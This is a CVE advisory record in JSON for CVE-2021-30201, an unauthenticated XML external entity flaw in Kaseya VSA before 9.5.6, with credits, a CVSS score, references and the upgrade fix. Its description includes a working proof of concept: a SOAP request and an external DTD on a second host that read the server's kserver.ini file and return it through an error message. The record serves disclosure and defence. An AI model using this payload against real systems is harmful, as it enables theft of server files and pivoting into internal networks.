---
layout: cve-json-40
discovered_by:
  - Wietse Boonstra
json: {
    "CVE_data_meta": {
        "ASSIGNER" : "cve@mitre.org",
        "ID": "CVE-2021-30201",
        "STATE": "PUBLIC",
        "TITLE": "Unauthenticated XML External Entity vulnerability in Kaseya VSA < v9.5.6"
    },
    "affects": {
        "vendor": {
            "vendor_data": [
                {
                    "product": {
                        "product_data": [
                            {
                                "product_name": "Kaseya VSA",
                                "version": {
                                    "version_data": [
                                        {
                                            "version_affected": "<",
                                            "version_name": "9.x",
                                            "version_value": "9.5.6"
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    "vendor_name": "Kaseya"
                }
            ]
        }
    },
    "credit": [
        {
            "lang": "eng",
            "value": "Discovered by Wietse Boonstra of DIVD"
        },
        {
            "lang": "eng",
            "value": "Additional research by Frank Breedijk of DIVD"
        }
    ],
    "data_format": "MITRE",
    "data_type": "CVE",
    "data_version": "4.0",
    "description": {
        "description_data": [
            {
                "lang": "eng",
                "value": "The API /vsaWS/KaseyaWS.asmx can be used to submit XML to the system. When this XML is processed (external) entities are insecurely processed and fetched by the system and returned to the attacker.\n\nDetailed description\n\nGiven the following request:\n```\nPOST /vsaWS/KaseyaWS.asmx HTTP/1.1\nContent-Type: text/xml;charset=UTF-8\nHost: 192.168.1.194:18081\nContent-Length: 406\n \n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:kas=\"KaseyaWS\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <kas:PrimitiveResetPassword>\n         <!--type: string-->\n         <kas:XmlRequest><![CDATA[<!DOCTYPE data SYSTEM \"http://192.168.1.170:8080/oob.dtd\"><data>&send;</data>]]>\n</kas:XmlRequest>\n      </kas:PrimitiveResetPassword>\n   </soapenv:Body>\n</soapenv:Envelope>\n```\n \nAnd the following XML file hosted at http://192.168.1.170/oob.dtd:\n```\n<!ENTITY % file SYSTEM \"file://c:\\\\kaseya\\\\kserver\\\\kserver.ini\">\n<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n%eval;\n%error;\n```\n\nThe server will fetch this XML file and process it, it will read the file  c:\\\\kaseya\\\\kserver\\\\kserver.ini and returns the content in the server response like below.\nResponse:\n```\nHTTP/1.1 500 Internal Server Error\nCache-Control: private\nContent-Type: text/xml; charset=utf-8\nDate: Fri, 02 Apr 2021 10:07:38 GMT\nStrict-Transport-Security: max-age=63072000; includeSubDomains\nConnection: close\nContent-Length: 2677\n \n<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>Server was unable to process request. ---&gt; There is an error in XML document (24, -1000).\\r\\n\\r\\nSystem.Xml.XmlException: Fragment identifier '########################################################################\n# This is the configuration file for the KServer.\n# Place it in the same directory as the KServer executable\n# A blank line or new valid section header [] terminates each section.\n# Comment lines start with ; or #\n########################################################################\n<snip>\n```\n\nSecurity issues discovered\n---\n* The API insecurely resolves external XML entities\n* The API has an overly verbose error response\n\nImpact\n---\nUsing this vulnerability an attacker can read any file on the server the webserver process can read. Additionally, it can be used to perform HTTP(s) requests into the local network and thus use the Kaseya system to pivot into the local network.\n\n"
            }
        ]
    },
    "generator": {
        "engine": "Vulnogram 0.0.9"
    },
    "impact": {
        "cvss": {
            "attackComplexity": "LOW",
            "attackVector": "NETWORK",
            "availabilityImpact": "NONE",
            "baseScore": 7.5,
            "baseSeverity": "HIGH",
            "confidentialityImpact": "HIGH",
            "integrityImpact": "NONE",
            "privilegesRequired": "NONE",
            "scope": "UNCHANGED",
            "userInteraction": "NONE",
            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "version": "3.1"
        }
    },
    "problemtype": {
        "problemtype_data": [
            {
                "description": [
                    {
                        "lang": "eng",
                        "value": "CWE-611 Improper Restriction of XML External Entity Reference ('XXE')"
                    }
                ]
            }
        ]
    },
    "references": {
        "reference_data": [
            {
                "name": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/2021/07/07/Kaseya-Limited-Disclosure/"
            },
            {
                "name": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021",
                "refsource": "CONFIRM",
                "url": "https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021"
            },
            {
                "name": "https://csirt.divd.nl/DIVD-2021-00011",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/DIVD-2021-00011"
            },
            {
                "name": "https://csirt.divd.nl/CVE-2021-30201",
                "refsource": "CONFIRM",
                "url": "https://csirt.divd.nl/CVE-2021-30201"
            }
        ]
    },
    "solution": [
        {
            "lang": "eng",
            "value": "Upgrade to version 9.5.6 or higher"
        }
    ],
    "source": {
        "advisory": "DIVD-2021-00011",
        "discovery": "INTERNAL"
    }
}
---

